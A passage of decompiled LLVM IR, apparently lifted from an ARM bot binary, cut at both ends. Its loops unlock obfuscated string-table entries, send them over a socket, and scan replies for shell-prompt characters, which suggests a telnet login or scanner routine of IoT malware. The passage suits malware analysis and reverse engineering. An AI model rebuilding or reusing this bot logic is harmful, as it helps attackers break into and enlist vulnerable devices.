  %v2_11160 = icmp ugt i8 %v3_1117c, 34
  store i1 %v2_11160, i1* %cpsr_c.global-to-local, align 1
  %v7_11160 = icmp eq i8 %v3_1117c, 35
  store i1 %v7_11160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11160, label %dec_label_pc_1118c, label %dec_label_pc_11168

dec_label_pc_11168:                               ; preds = %dec_label_pc_11160
  %v2_11168 = icmp ugt i8 %v3_1117c, 36
  store i1 %v2_11168, i1* %cpsr_c.global-to-local, align 1
  %v7_11168 = icmp eq i8 %v3_1117c, 37
  store i1 %v7_11168, i1* %cpsr_z.global-to-local, align 1
  %v1_1116c = add i32 %v0_1116c, -1
  store i32 %v1_1116c, i32* %r3.global-to-local, align 4
  br i1 %v7_11168, label %dec_label_pc_1118c, label %dec_label_pc_11174

dec_label_pc_11174:                               ; preds = %dec_label_pc_11174.preheader, %dec_label_pc_11168
  %v0_1116c = phi i32 [ %v2_1114c, %dec_label_pc_11174.preheader ], [ %v1_1116c, %dec_label_pc_11168 ]
  %v0_11174 = phi i32 [ %v1_11114, %dec_label_pc_11174.preheader ], [ %v1_11174, %dec_label_pc_11168 ]
  %v1_11174 = add i32 %v0_11174, -1
  store i32 %v1_11174, i32* %r1.global-to-local, align 4
  %v2_11174 = icmp ne i32 %v0_11174, 0
  store i1 %v2_11174, i1* %cpsr_c.global-to-local, align 1
  %v7_11174 = icmp eq i32 %v0_11174, 1
  store i1 %v7_11174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11174, label %dec_label_pc_10cd0.backedge.thread528, label %dec_label_pc_1117c

dec_label_pc_1117c:                               ; preds = %dec_label_pc_11174
  %v1_1117c = add i32 %v0_1116c, -2
  %v2_1117c = inttoptr i32 %v1_1117c to i8*
  %v3_1117c = load i8, i8* %v2_1117c, align 1
  %v4_1117c = zext i8 %v3_1117c to i32
  store i32 %v4_1117c, i32* %r2.global-to-local, align 4
  %v2_11180 = icmp ugt i8 %v3_1117c, 61
  store i1 %v2_11180, i1* %cpsr_c.global-to-local, align 1
  %v7_11180 = icmp eq i8 %v3_1117c, 62
  store i1 %v7_11180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11180, label %dec_label_pc_1118c, label %bb404

bb404:                                            ; preds = %dec_label_pc_1117c
  %v3_11184 = icmp ugt i8 %v3_1117c, 57
  store i1 %v3_11184, i1* %cpsr_c.global-to-local, align 1
  %v8_11184 = icmp eq i8 %v3_1117c, 58
  store i1 %v8_11184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11184, label %dec_label_pc_1118c, label %dec_label_pc_11158

dec_label_pc_1118c:                               ; preds = %dec_label_pc_1117c, %bb404, %dec_label_pc_11168, %dec_label_pc_11160, %dec_label_pc_11158, %dec_label_pc_11144, %dec_label_pc_11120, %dec_label_pc_1113c, %dec_label_pc_11134, %bb403
  %v0_11190 = phi i32 [ %v1_11114, %dec_label_pc_11144 ], [ %v1_11114, %dec_label_pc_11120 ], [ %v1_11114, %dec_label_pc_1113c ], [ %v1_11114, %dec_label_pc_11134 ], [ %v1_11114, %bb403 ], [ %v1_11174, %dec_label_pc_11158 ], [ %v1_11174, %dec_label_pc_11160 ], [ %v1_11174, %dec_label_pc_11168 ], [ %v1_11174, %bb404 ], [ %v1_11174, %dec_label_pc_1117c ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11190 = add i32 %v0_11190, 1
  store i32 %v1_11190, i32* @r7, align 4
  %v1_11194 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_11348, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_111a4 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_111a4, i32* %r0.global-to-local, align 4
  %v3_111a8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_111a8, i32* %r2.global-to-local, align 4
  store i32 %v3_111a4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_111b4 = load i32, i32* @r5, align 4
  %v1_111b4 = add i32 %v0_111b4, 4
  %v2_111b4 = inttoptr i32 %v1_111b4 to i32*
  %v3_111b4 = load i32, i32* %v2_111b4, align 4
  store i32 %v3_111b4, i32* %r0.global-to-local, align 4
  %v4_111b8 = call i32 @__libc_send(i32 %v3_111b4, i32 %v3_111a4, i32 %v3_111a8, i32 16384)
  store i32 %v4_111b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_111c8 = load i32, i32* @r5, align 4
  %v1_111c8 = add i32 %v0_111c8, 4
  %v2_111c8 = inttoptr i32 %v1_111c8 to i32*
  %v3_111c8 = load i32, i32* %v2_111c8, align 4
  store i32 %v3_111c8, i32* %r0.global-to-local, align 4
  %v4_111cc = call i32 @__libc_send(i32 %v3_111c8, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2, i32 16384)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_111d4 = call i32 @table_lock_val(i32 25)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_111dc = load i32, i32* @r5, align 4
  %v2_111dc = add i32 %v1_111dc, 12
  %v3_111dc = inttoptr i32 %v2_111dc to i32*
  store i32 9, i32* %v3_111dc, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_111e4:                               ; preds = %dec_label_pc_10d4c
  %v1_111e4 = add i32 %v0_10d4c, 24
  %v2_111e4 = inttoptr i32 %v1_111e4 to i32*
  %v3_111e4 = load i32, i32* %v2_111e4, align 4
  store i32 %v3_111e4, i32* %r2.global-to-local, align 4
  %v1_111e8 = add i32 %v3_111e4, -1
  store i32 %v1_111e8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_111ec = icmp eq i32 %v1_111e8, 0
  store i1 %v2_111ec, i1* %cpsr_z.global-to-local, align 1
  %tmp405 = icmp slt i32 %v1_111e8, 1
  br i1 %tmp405, label %dec_label_pc_10cd0.backedge.thread, label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111e4
  %v2_111f4 = add i32 %v1_111e8, %v0_10d4c
  store i32 %v2_111f4, i32* %r3.global-to-local, align 4
  %v1_111f8 = add i32 %v2_111f4, 28
  %v2_111f8 = inttoptr i32 %v1_111f8 to i8*
  %v3_111f8 = load i8, i8* %v2_111f8, align 1
  %v4_111f8 = zext i8 %v3_111f8 to i32
  store i32 %v4_111f8, i32* %r3.global-to-local, align 4
  %v2_111fc = icmp ugt i8 %v3_111f8, 61
  store i1 %v2_111fc, i1* %cpsr_c.global-to-local, align 1
  %v7_111fc = icmp eq i8 %v3_111f8, 62
  store i1 %v7_111fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111fc, label %dec_label_pc_11260, label %bb406

bb406:                                            ; preds = %dec_label_pc_111f4
  %v3_11200 = icmp ugt i8 %v3_111f8, 57
  store i1 %v3_11200, i1* %cpsr_c.global-to-local, align 1
  %v8_11200 = icmp eq i8 %v3_111f8, 58
  store i1 %v8_11200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11200, label %dec_label_pc_11260, label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %bb406
  %v2_11208 = icmp ugt i8 %v3_111f8, 35
  store i1 %v2_11208, i1* %cpsr_c.global-to-local, align 1
  %v7_11208 = icmp eq i8 %v3_111f8, 36
  store i1 %v7_11208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11208, label %dec_label_pc_11260, label %dec_label_pc_11210

dec_label_pc_11210:                               ; preds = %dec_label_pc_11208
  %v2_11210 = icmp ugt i8 %v3_111f8, 34
  store i1 %v2_11210, i1* %cpsr_c.global-to-local, align 1
  %v7_11210 = icmp eq i8 %v3_111f8, 35
  store i1 %v7_11210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11210, label %dec_label_pc_11260, label %dec_label_pc_11218

dec_label_pc_11218:                               ; preds = %dec_label_pc_11210
  %v2_11218 = icmp ugt i8 %v3_111f8, 36
  store i1 %v2_11218, i1* %cpsr_c.global-to-local, align 1
  %v7_11218 = icmp eq i8 %v3_111f8, 37
  store i1 %v7_11218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11218, label %dec_label_pc_11260, label %dec_label_pc_11248.preheader

dec_label_pc_11248.preheader:                     ; preds = %dec_label_pc_11218
  %v3_1121c = add i32 %v0_10d4c, 28
  %v2_11220 = add i32 %v3_1121c, %v3_111e4
  store i32 %v2_11220, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11248

dec_label_pc_1122c:                               ; preds = %bb407
  %v2_1122c = icmp ugt i8 %v3_11250, 35
  store i1 %v2_1122c, i1* %cpsr_c.global-to-local, align 1
  %v7_1122c = icmp eq i8 %v3_11250, 36
  store i1 %v7_1122c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1122c, label %dec_label_pc_11260, label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_1122c
  %v2_11234 = icmp ugt i8 %v3_11250, 34
  store i1 %v2_11234, i1* %cpsr_c.global-to-local, align 1
  %v7_11234 = icmp eq i8 %v3_11250, 35
  store i1 %v7_11234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11234, label %dec_label_pc_11260, label %dec_label_pc_1123c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_11234
  %v2_1123c = icmp ugt i8 %v3_11250, 36
  store i1 %v2_1123c, i1* %cpsr_c.global-to-local, align 1
  %v7_1123c = icmp eq i8 %v3_11250, 37
  store i1 %v7_1123c, i1* %cpsr_z.global-to-local, align 1
  %v1_11240 = add i32 %v0_11240, -1
  store i32 %v1_11240, i32* %r3.global-to-local, align 4
  br i1 %v7_1123c, label %dec_label_pc_11260, label %dec_label_pc_11248

dec_label_pc_11248:                               ; preds = %dec_label_pc_11248.preheader, %dec_label_pc_1123c
  %v0_11240 = phi i32 [ %v2_11220, %dec_label_pc_11248.preheader ], [ %v1_11240, %dec_label_pc_1123c ]
  %v0_11248 = phi i32 [ %v1_111e8, %dec_label_pc_11248.preheader ], [ %v1_11248, %dec_label_pc_1123c ]
  %v1_11248 = add i32 %v0_11248, -1
  store i32 %v1_11248, i32* %r1.global-to-local, align 4
  %v2_11248 = icmp ne i32 %v0_11248, 0
  store i1 %v2_11248, i1* %cpsr_c.global-to-local, align 1
  %v7_11248 = icmp eq i32 %v0_11248, 1
  store i1 %v7_11248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11248, label %dec_label_pc_10cd0.backedge.thread528, label %dec_label_pc_11250

dec_label_pc_11250:                               ; preds = %dec_label_pc_11248
  %v1_11250 = add i32 %v0_11240, -2
  %v2_11250 = inttoptr i32 %v1_11250 to i8*
  %v3_11250 = load i8, i8* %v2_11250, align 1
  %v4_11250 = zext i8 %v3_11250 to i32
  store i32 %v4_11250, i32* %r2.global-to-local, align 4
  %v2_11254 = icmp ugt i8 %v3_11250, 61
  store i1 %v2_11254, i1* %cpsr_c.global-to-local, align 1
  %v7_11254 = icmp eq i8 %v3_11250, 62
  store i1 %v7_11254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11254, label %dec_label_pc_11260, label %bb407

bb407:                                            ; preds = %dec_label_pc_11250
  %v3_11258 = icmp ugt i8 %v3_11250, 57
  store i1 %v3_11258, i1* %cpsr_c.global-to-local, align 1
  %v8_11258 = icmp eq i8 %v3_11250, 58
  store i1 %v8_11258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11258, label %dec_label_pc_11260, label %dec_label_pc_1122c

dec_label_pc_11260:                               ; preds = %dec_label_pc_11250, %bb407, %dec_label_pc_1123c, %dec_label_pc_11234, %dec_label_pc_1122c, %dec_label_pc_11218, %dec_label_pc_111f4, %dec_label_pc_11210, %dec_label_pc_11208, %bb406
  %v0_11264 = phi i32 [ %v1_111e8, %dec_label_pc_11218 ], [ %v1_111e8, %dec_label_pc_111f4 ], [ %v1_111e8, %dec_label_pc_11210 ], [ %v1_111e8, %dec_label_pc_11208 ], [ %v1_111e8, %bb406 ], [ %v1_11248, %dec_label_pc_1122c ], [ %v1_11248, %dec_label_pc_11234 ], [ %v1_11248, %dec_label_pc_1123c ], [ %v1_11248, %bb407 ], [ %v1_11248, %dec_label_pc_11250 ]
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11264 = add i32 %v0_11264, 1
  store i32 %v1_11264, i32* @r7, align 4
  %v1_11268 = call i32 @table_unlock_val(i32 23)
  store i32 %v2_11348, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_11278 = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-60)
  store i32 %v3_11278, i32* %r0.global-to-local, align 4
  %v3_1127c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1127c, i32* %r2.global-to-local, align 4
  store i32 %v3_11278, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11288 = load i32, i32* @r5, align 4
  %v1_11288 = add i32 %v0_11288, 4
  %v2_11288 = inttoptr i32 %v1_11288 to i32*
  %v3_11288 = load i32, i32* %v2_11288, align 4
  store i32 %v3_11288, i32* %r0.global-to-local, align 4
  %v4_1128c = call i32 @__libc_send(i32 %v3_11288, i32 %v3_11278, i32 %v3_1127c, i32 16384)
  store i32 %v4_1128c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1129c = load i32, i32* @r5, align 4
  %v1_1129c = add i32 %v0_1129c, 4
  %v2_1129c = inttoptr i32 %v1_1129c to i32*
  %v3_1129c = load i32, i32* %v2_1129c, align 4
  store i32 %v3_1129c, i32* %r0.global-to-local, align 4
  %v4_112a0 = call i32 @__libc_send(i32 %v3_1129c, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_112a8 = call i32 @table_lock_val(i32 23)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_112b0 = load i32, i32* @r5, align 4
  %v2_112b0 = add i32 %v1_112b0, 12
  %v3_112b0 = inttoptr i32 %v2_112b0 to i32*
  store i32 6, i32* %v3_112b0, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_112b8:                               ; preds = %dec_label_pc_10d4c
  %v1_112b8 = add i32 %v0_10d4c, 24
  %v2_112b8 = inttoptr i32 %v1_112b8 to i32*
  %v3_112b8 = load i32, i32* %v2_112b8, align 4
  store i32 %v3_112b8, i32* %r2.global-to-local, align 4
  %v1_112bc = add i32 %v3_112b8, -1
  store i32 %v1_112bc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_112c0 = icmp eq i32 %v1_112bc, 0
  store i1 %v2_112c0, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v1_112bc, 1
  br i1 %tmp408, label %dec_label_pc_11334, label %dec_label_pc_112c8

dec_label_pc_112c8:                               ; preds = %dec_label_pc_112b8
  %v2_112c8 = add i32 %v1_112bc, %v0_10d4c
  store i32 %v2_112c8, i32* %r3.global-to-local, align 4
  %v1_112cc = add i32 %v2_112c8, 28
  %v2_112cc = inttoptr i32 %v1_112cc to i8*
  %v3_112cc = load i8, i8* %v2_112cc, align 1
  %v4_112cc = zext i8 %v3_112cc to i32
  store i32 %v4_112cc, i32* %r3.global-to-local, align 4
  %v2_112d0 = icmp ugt i8 %v3_112cc, 61
  store i1 %v2_112d0, i1* %cpsr_c.global-to-local, align 1
  %v7_112d0 = icmp eq i8 %v3_112cc, 62
  store i1 %v7_112d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112d0, label %dec_label_pc_115ec, label %bb409

bb409:                                            ; preds = %dec_label_pc_112c8
  %v3_112d4 = icmp ugt i8 %v3_112cc, 57
  store i1 %v3_112d4, i1* %cpsr_c.global-to-local, align 1
  %v8_112d4 = icmp eq i8 %v3_112cc, 58
  store i1 %v8_112d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112d4, label %dec_label_pc_115ec, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %bb409
  %v2_112dc = icmp ugt i8 %v3_112cc, 35
  store i1 %v2_112dc, i1* %cpsr_c.global-to-local, align 1
  %v7_112dc = icmp eq i8 %v3_112cc, 36
  store i1 %v7_112dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112dc, label %dec_label_pc_115ec, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112dc
  %v2_112e4 = icmp ugt i8 %v3_112cc, 34
  store i1 %v2_112e4, i1* %cpsr_c.global-to-local, align 1
  %v7_112e4 = icmp eq i8 %v3_112cc, 35
  store i1 %v7_112e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e4, label %dec_label_pc_115ec, label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112e4
  %v2_112ec = icmp ugt i8 %v3_112cc, 36
  store i1 %v2_112ec, i1* %cpsr_c.global-to-local, align 1
  %v7_112ec = icmp eq i8 %v3_112cc, 37
  store i1 %v7_112ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112ec, label %dec_label_pc_115ec, label %dec_label_pc_1132c.preheader

dec_label_pc_1132c.preheader:                     ; preds = %dec_label_pc_112ec
  %v3_112f0 = add i32 %v0_10d4c, 28
  %v2_112f4 = add i32 %v3_112f0, %v3_112b8
  store i32 %v2_112f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1132c

dec_label_pc_11300:                               ; preds = %dec_label_pc_1132c
  %v1_11300 = add i32 %v0_11324, -2
  %v2_11300 = inttoptr i32 %v1_11300 to i8*
  %v3_11300 = load i8, i8* %v2_11300, align 1
  %v4_11300 = zext i8 %v3_11300 to i32
  store i32 %v4_11300, i32* %r2.global-to-local, align 4
  %v2_11304 = icmp ugt i8 %v3_11300, 61
  store i1 %v2_11304, i1* %cpsr_c.global-to-local, align 1
  %v7_11304 = icmp eq i8 %v3_11300, 62
  store i1 %v7_11304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11304, label %dec_label_pc_115ec, label %bb410

bb410:                                            ; preds = %dec_label_pc_11300
  %v3_11308 = icmp ugt i8 %v3_11300, 57
  store i1 %v3_11308, i1* %cpsr_c.global-to-local, align 1
  %v8_11308 = icmp eq i8 %v3_11300, 58
  store i1 %v8_11308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11308, label %dec_label_pc_115ec, label %dec_label_pc_11310

dec_label_pc_11310:                               ; preds = %bb410
  %v2_11310 = icmp ugt i8 %v3_11300, 35
  store i1 %v2_11310, i1* %cpsr_c.global-to-local, align 1
  %v7_11310 = icmp eq i8 %v3_11300, 36
  store i1 %v7_11310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11310, label %dec_label_pc_115ec, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11310
  %v2_11318 = icmp ugt i8 %v3_11300, 34
  store i1 %v2_11318, i1* %cpsr_c.global-to-local, align 1
  %v7_11318 = icmp eq i8 %v3_11300, 35
  store i1 %v7_11318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11318, label %dec_label_pc_115ec, label %dec_label_pc_11320

dec_label_pc_11320:                               ; preds = %dec_label_pc_11318
  %v2_11320 = icmp ugt i8 %v3_11300, 36
  store i1 %v2_11320, i1* %cpsr_c.global-to-local, align 1
  %v7_11320 = icmp eq i8 %v3_11300, 37
  store i1 %v7_11320, i1* %cpsr_z.global-to-local, align 1
  %v1_11324 = add i32 %v0_11324, -1
  store i32 %v1_11324, i32* %r3.global-to-local, align 4
  br i1 %v7_11320, label %dec_label_pc_115ec, label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %dec_label_pc_1132c.preheader, %dec_label_pc_11320
  %v0_11324 = phi i32 [ %v2_112f4, %dec_label_pc_1132c.preheader ], [ %v1_11324, %dec_label_pc_11320 ]
  %v0_1132c = phi i32 [ %v1_112bc, %dec_label_pc_1132c.preheader ], [ %v1_1132c, %dec_label_pc_11320 ]
  %v1_1132c = add i32 %v0_1132c, -1
  store i32 %v1_1132c, i32* %r0.global-to-local, align 4
  %v2_1132c = icmp ne i32 %v0_1132c, 0
  store i1 %v2_1132c, i1* %cpsr_c.global-to-local, align 1
  %v7_1132c = icmp eq i32 %v0_1132c, 1
  store i1 %v7_1132c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1132c, label %dec_label_pc_11334, label %dec_label_pc_11300

dec_label_pc_11334:                               ; preds = %dec_label_pc_1132c, %dec_label_pc_112b8
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_11338 = call i32 @table_unlock_val(i32 30)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_11340 = call i32 @table_unlock_val(i32 31)
  store i32 %v2_11348, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_11350 = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  store i32 %v3_11350, i32* @r4, align 4
  store i32 %v2_1135c, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_11364 = call i32 @table_retrieve_val(i32 31, i32* %v2_11364)
  %v3_11368 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_11364, 16777216
  %v1_1136c = sdiv i32 %sext, 16777216
  store i32 %v1_1136c, i32* @r6, align 4
  %v0_11370 = load i32, i32* @r4, align 4
  store i32 %v0_11370, i32* %r2.global-to-local, align 4
  %v1_11374 = add i32 %v3_11368, -1
  store i32 %v1_11374, i32* %r3.global-to-local, align 4
  %v0_11378 = load i32, i32* @sl, align 4
  store i32 %v0_11378, i32* %r0.global-to-local, align 4
  %v0_1137c = load i32, i32* @r5, align 4
  %v1_1137c = add i32 %v0_1137c, 24
  %v2_1137c = inttoptr i32 %v1_1137c to i32*
  %v3_1137c = load i32, i32* %v2_1137c, align 4
  store i32 %v3_1137c, i32* %r1.global-to-local, align 4
  %v4_11380 = call i32 @util_memsearch(i32 %v0_11378, i32 %v3_1137c, i32 %v0_11370, i32 %v1_11374)
  store i32 %v4_11380, i32* %r0.global-to-local, align 4
  %v2_11384 = icmp eq i32 %v4_11380, -1
  store i1 %v2_11384, i1* %cpsr_c.global-to-local, align 1
  %v7_11384 = icmp eq i32 %v4_11380, -1
  store i1 %v7_11384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11384, label %dec_label_pc_11728, label %dec_label_pc_11394

dec_label_pc_11394:                               ; preds = %dec_label_pc_11728, %dec_label_pc_11334
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_11398 = call i32 @table_lock_val(i32 30)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_113a0 = call i32 @table_lock_val(i32 31)
  store i32 %v1_113a0, i32* %r0.global-to-local, align 4
  %v0_113a4 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113a4 = icmp eq i32 %v0_113a4, 0
  store i1 %v2_113a4, i1* %cpsr_z.global-to-local, align 1
  %tmp411 = icmp slt i32 %v0_113a4, 1
  br i1 %tmp411, label %dec_label_pc_11498, label %dec_label_pc_11394.dec_label_pc_115f0_crit_edge

dec_label_pc_11394.dec_label_pc_115f0_crit_edge:  ; preds = %dec_label_pc_11394
  %v0_115f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_115f0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_10d4c
  %v1_113b0 = add i32 %v0_10d4c, 24
  %v2_113b0 = inttoptr i32 %v1_113b0 to i32*
  %v3_113b0 = load i32, i32* %v2_113b0, align 4
  store i32 %v3_113b0, i32* %r2.global-to-local, align 4
  %v1_113b4 = add i32 %v3_113b0, -1
  store i32 %v1_113b4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113b8 = icmp eq i32 %v1_113b4, 0
  store i1 %v2_113b8, i1* %cpsr_z.global-to-local, align 1
  %tmp412 = icmp slt i32 %v1_113b4, 1
  br i1 %tmp412, label %dec_label_pc_1141c, label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %dec_label_pc_113b0
  %v2_113c0 = add i32 %v1_113b4, %v0_10d4c
  store i32 %v2_113c0, i32* %r3.global-to-local, align 4
  %v1_113c4 = add i32 %v2_113c0, 28
  %v2_113c4 = inttoptr i32 %v1_113c4 to i8*
  %v3_113c4 = load i8, i8* %v2_113c4, align 1
  %v4_113c4 = zext i8 %v3_113c4 to i32
  store i32 %v4_113c4, i32* %r3.global-to-local, align 4
  %v2_113c8 = icmp ugt i8 %v3_113c4, 61
  store i1 %v2_113c8, i1* %cpsr_c.global-to-local, align 1
  %v7_113c8 = icmp eq i8 %v3_113c4, 62
  store i1 %v7_113c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113c8, label %dec_label_pc_115e4, label %bb413

bb413:                                            ; preds = %dec_label_pc_113c0
  %v3_113cc = icmp ugt i8 %v3_113c4, 57
  store i1 %v3_113cc, i1* %cpsr_c.global-to-local, align 1
  %v8_113cc = icmp eq i8 %v3_113c4, 58
  store i1 %v8_113cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_113cc, label %dec_label_pc_115e4, label %dec_label_pc_113d4

dec_label_pc_113d4:                               ; preds = %bb413
  %v2_113d4 = icmp ugt i8 %v3_113c4, 35
  store i1 %v2_113d4, i1* %cpsr_c.global-to-local, align 1
  %v7_113d4 = icmp eq i8 %v3_113c4, 36
  store i1 %v7_113d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113d4, label %dec_label_pc_115e4, label %dec_label_pc_113dc

dec_label_pc_113dc:                               ; preds = %dec_label_pc_113d4
  %v2_113dc = icmp ugt i8 %v3_113c4, 34
  store i1 %v2_113dc, i1* %cpsr_c.global-to-local, align 1
  %v7_113dc = icmp eq i8 %v3_113c4, 35
  store i1 %v7_113dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113dc, label %dec_label_pc_115e4, label %dec_label_pc_11414.preheader

dec_label_pc_11414.preheader:                     ; preds = %dec_label_pc_113dc
  %v3_113e0 = add i32 %v0_10d4c, 28
  %v2_113e4 = add i32 %v3_113e0, %v3_113b0
  store i32 %v2_113e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11414

dec_label_pc_113f0:                               ; preds = %dec_label_pc_11414
  %v1_113f0 = add i32 %v0_1140c, -2
  %v2_113f0 = inttoptr i32 %v1_113f0 to i8*
  %v3_113f0 = load i8, i8* %v2_113f0, align 1
  %v4_113f0 = zext i8 %v3_113f0 to i32
  store i32 %v4_113f0, i32* %r2.global-to-local, align 4
  %v2_113f4 = icmp ugt i8 %v3_113f0, 61
  store i1 %v2_113f4, i1* %cpsr_c.global-to-local, align 1
  %v7_113f4 = icmp eq i8 %v3_113f0, 62
  store i1 %v7_113f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113f4, label %dec_label_pc_115e4, label %bb414

bb414:                                            ; preds = %dec_label_pc_113f0
  %v3_113f8 = icmp ugt i8 %v3_113f0, 57
  store i1 %v3_113f8, i1* %cpsr_c.global-to-local, align 1
  %v8_113f8 = icmp eq i8 %v3_113f0, 58
  store i1 %v8_113f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_113f8, label %dec_label_pc_115e4, label %dec_label_pc_11400

dec_label_pc_11400:                               ; preds = %bb414
  %v2_11400 = icmp ugt i8 %v3_113f0, 35
  store i1 %v2_11400, i1* %cpsr_c.global-to-local, align 1
  %v7_11400 = icmp eq i8 %v3_113f0, 36
  store i1 %v7_11400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11400, label %dec_label_pc_115e4, label %dec_label_pc_11408

dec_label_pc_11408:                               ; preds = %dec_label_pc_11400
  %v2_11408 = icmp ugt i8 %v3_113f0, 34
  store i1 %v2_11408, i1* %cpsr_c.global-to-local, align 1
  %v7_11408 = icmp eq i8 %v3_113f0, 35
  store i1 %v7_11408, i1* %cpsr_z.global-to-local, align 1
  %v1_1140c = add i32 %v0_1140c, -1
  store i32 %v1_1140c, i32* %r3.global-to-local, align 4
  br i1 %v7_11408, label %dec_label_pc_115e4, label %dec_label_pc_11414

dec_label_pc_11414:                               ; preds = %dec_label_pc_11414.preheader, %dec_label_pc_11408
  %v0_1140c = phi i32 [ %v2_113e4, %dec_label_pc_11414.preheader ], [ %v1_1140c, %dec_label_pc_11408 ]
  %v0_11414 = phi i32 [ %v1_113b4, %dec_label_pc_11414.preheader ], [ %v1_11414, %dec_label_pc_11408 ]
  %v1_11414 = add i32 %v0_11414, -1
  store i32 %v1_11414, i32* %r0.global-to-local, align 4
  %v2_11414 = icmp ne i32 %v0_11414, 0
  store i1 %v2_11414, i1* %cpsr_c.global-to-local, align 1
  %v7_11414 = icmp eq i32 %v0_11414, 1
  store i1 %v7_11414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11414, label %dec_label_pc_1141c, label %dec_label_pc_113f0

dec_label_pc_1141c:                               ; preds = %dec_label_pc_11414, %dec_label_pc_113b0
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_11420 = call i32 @table_unlock_val(i32 29)
